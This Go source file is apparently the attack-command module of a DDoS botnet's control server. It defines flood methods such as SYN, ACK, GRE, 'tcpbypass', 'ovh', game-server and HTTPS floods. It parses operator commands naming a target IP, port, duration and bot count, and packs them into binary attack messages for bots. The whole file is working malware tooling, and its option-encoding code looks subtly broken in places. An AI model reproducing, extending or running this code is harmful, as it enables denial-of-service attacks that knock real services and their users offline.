package main

import (
	"encoding/binary"
	"errors"
	"net"
	"strconv"
	"strings"
)

const (
	ATTACK_UDP = 0x01

	ATTACK_HEX    = 0x05
	ATTACK_UDPRAW = 0x06

	ATTACK_UDPTHREADS = 0x08
	ATTACK_TCPRAW     = 0x0a
	ATTACK_TCP_ACK    = 0x0b
	ATTACK_TCP_SYN    = 0x0c
	ATTACK_GRE        = 0x0e
	ATTACK_TCP_STOMP  = 0x12
	ATTACK_TCP_BYPASS = 0x13
	ATTACK_UDPLEGIT   = 0x14
	ATTACK_UDP_GAME   = 0x16
	ATTACK_OVH        = 0x17
	ATTACK_HTTPS      = 0x18

	ATK_OPT_PAYLOAD_SIZE = 0
	ATK_OPT_PAYLOAD_RAND = 1
	ATK_OPT_IP_TOS       = 2
	ATK_OPT_IP_IDENT     = 3
	ATK_OPT_IP_TTL       = 4
	ATK_OPT_IP_DF        = 5
	ATK_OPT_SPORT        = 6
	ATK_OPT_DPORT        = 7
	ATK_OPT_DOMAIN       = 8
	ATK_OPT_CONNS        = 9
	ATK_OPT_TCP_ACK      = 13
	ATK_OPT_TCP_SYN      = 14
	ATK_OPT_TCP_PSH      = 15
	ATK_OPT_TCP_RST      = 16
	ATK_OPT_TCP_FIN      = 17
	ATK_OPT_TCP_URG      = 18
	ATK_OPT_MINECRAFT    = 19
	ATK_OPT_GRE_CONSTIP  = 20
	ATK_OPT_THREADS      = 21
)

var AttackMethodMap = map[string]uint8{
	"udp": ATTACK_UDP,

	"hex":    ATTACK_HEX,
	"udpraw": ATTACK_UDPRAW,

	"udpthreads": ATTACK_UDPTHREADS,
	"tcpraw":     ATTACK_TCPRAW,
	"ack":        ATTACK_TCP_ACK,
	"syn":        ATTACK_TCP_SYN,
	"gre":        ATTACK_GRE,
	"tcpstomp":   ATTACK_TCP_STOMP,
	"tcpbypass":  ATTACK_TCP_BYPASS,
	"udplegit":   ATTACK_UDPLEGIT,
	"game":       ATTACK_UDP_GAME,
	"ovh":        ATTACK_OVH,
	"https":      ATTACK_HTTPS,
}

type Attack struct {
	Method   uint8
	TargetIP uint32
	Port     uint16
	Duration uint32
	Bots     int
	Flags    map[uint8]string
}

func NewAttack(cmdLine string, admin int) (*Attack, error) {
	parts := strings.Fields(strings.TrimSpace(cmdLine))
	if len(parts) == 0 {
		return nil, errors.New("Empty command")
	}

	methodStr := parts[0]
	if methodStr[0] == '.' {
		methodStr = methodStr[1:]
	}

	methodID, ok := AttackMethodMap[methodStr]
	if !ok {
		return nil, errors.New("Unknown attack method: " + methodStr)
	}

	var ipInt uint32
	var port uint16
	var duration uint32
	var flags map[uint8]string = make(map[uint8]string)
	var flagStart int

	if methodID == ATTACK_HTTPS {
		if len(parts) < 3 {
			return nil, errors.New("Usage: .https [url] [time]")
		}
		// .https [url] [time]
		ipInt = 0
		port = 0
		d, err := strconv.Atoi(parts[2])
		if err != nil || d < 0 {
			return nil, errors.New("Invalid duration")
		}
		duration = uint32(d)
		flags[ATK_OPT_DOMAIN] = parts[1]
		flagStart = 3
	} else {
		if len(parts) < 4 {
			return nil, errors.New("Usage: ." + methodStr + " [ip] [port] [time] [flags...]")
		}

		ip := net.ParseIP(parts[1])
		if ip == nil {
			return nil, errors.New("Invalid IP address")
		}
		ip = ip.To4()
		if ip == nil {
			return nil, errors.New("IPv4 only")
		}
		ipInt = binary.BigEndian.Uint32(ip)

		p, err := strconv.Atoi(parts[2])
		if err != nil || p < 0 || p > 65535 {
			return nil, errors.New("Invalid port")
		}
		port = uint16(p)

		d, err := strconv.Atoi(parts[3])
		if err != nil || d < 0 {
			return nil, errors.New("Invalid duration")
		}
		duration = uint32(d)
		flagStart = 4
	}

	if len(parts) > flagStart {
		for _, part := range parts[flagStart:] {
			flagParts := strings.SplitN(part, "=", 2)
			if len(flagParts) == 2 {
				key := flagParts[0]
				val := flagParts[1]

				switch key {
				case "domain":
					flags[ATK_OPT_DOMAIN] = val
				case "conns":
					flags[ATK_OPT_CONNS] = val
				case "sport":
					flags[ATK_OPT_SPORT] = val
				case "size":
					sizeVal, _ := strconv.Atoi(val)
					if sizeVal > 1410 {
						sizeVal = 1410
					}
					flags[ATK_OPT_PAYLOAD_SIZE] = strconv.Itoa(sizeVal)
				case "rand":
					flags[ATK_OPT_PAYLOAD_RAND] = val
				case "threads":
					flags[ATK_OPT_THREADS] = val
				case "ttl":
					flags[ATK_OPT_IP_TTL] = val
				case "ack":
					flags[ATK_OPT_TCP_ACK] = val
				case "syn":
					flags[ATK_OPT_TCP_SYN] = val
				case "psh":
					flags[ATK_OPT_TCP_PSH] = val
				case "rst":
					flags[ATK_OPT_TCP_RST] = val
				case "fin":
					flags[ATK_OPT_TCP_FIN] = val
				case "urg":
					flags[ATK_OPT_TCP_URG] = val
				case "mc", "minecraft":
					flags[ATK_OPT_MINECRAFT] = val
				case "gcip", "constip":
					flags[ATK_OPT_GRE_CONSTIP] = val
				case "bots":
					botVal, _ := strconv.Atoi(val)
					flags[99] = strconv.Itoa(botVal) // Temporary key to move to struct later
				}
			}
		}
	}

	botCount := 0
	if val, ok := flags[99]; ok {
		botCount, _ = strconv.Atoi(val)
		delete(flags, 99)
	}

	return &Attack{
		Method:   methodID,
		TargetIP: ipInt,
		Port:     uint16(port),
		Duration: uint32(duration),
		Bots:     botCount,
		Flags:    flags,
	}, nil
}

func (this *Attack) Build() ([]byte, error) {
	// Structure:
	// Type (1 byte): 0x02 (MSG_TYPE_ATTACK)
	// Method (1 byte)
	// IP (4 bytes BE)
	// Port (2 bytes BE)
	// Duration (4 bytes BE)
	// Options (TLV...)

	buf := make([]byte, 12)

	buf[0] = 0x02
	buf[1] = this.Method
	binary.BigEndian.PutUint32(buf[2:], this.TargetIP)
	binary.BigEndian.PutUint16(buf[6:], this.Port)
	binary.BigEndian.PutUint32(buf[8:], this.Duration)

	if len(this.Flags) > 0 {
		for key, val := range this.Flags {
			if key == ATK_OPT_CONNS || key == ATK_OPT_SPORT || key == ATK_OPT_PAYLOAD_SIZE || key == ATK_OPT_IP_TTL || key == ATK_OPT_IP_TOS || key == ATK_OPT_IP_IDENT || (key >= ATK_OPT_TCP_ACK && key <= ATK_OPT_TCP_URG) || key == ATK_OPT_THREADS || key == ATK_OPT_GRE_CONSTIP {
				valInt, _ := strconv.Atoi(val)
				buf = append(buf, byte(key))
				if valInt > 65535 {
					buf = append(buf, 4)
					binary.BigEndian.PutUint32(buf[len(buf):len(buf)+4], uint32(valInt))
					buf = buf[:len(buf)+4]
				} else if valInt > 255 {
					buf = append(buf, 2)
					binary.BigEndian.PutUint16(buf[len(buf):len(buf)+2], uint16(valInt))
					buf = buf[:len(buf)+2]
				} else {
					buf = append(buf, 1)
					buf = append(buf, byte(valInt))
				}
			} else {
				valLen := len(val)
				if valLen > 255 {
					valLen = 255
					val = val[:255]
				}
				buf = append(buf, byte(key))
				buf = append(buf, byte(valLen))
				buf = append(buf, []byte(val)...)
			}
		}
	}

	return buf, nil
}
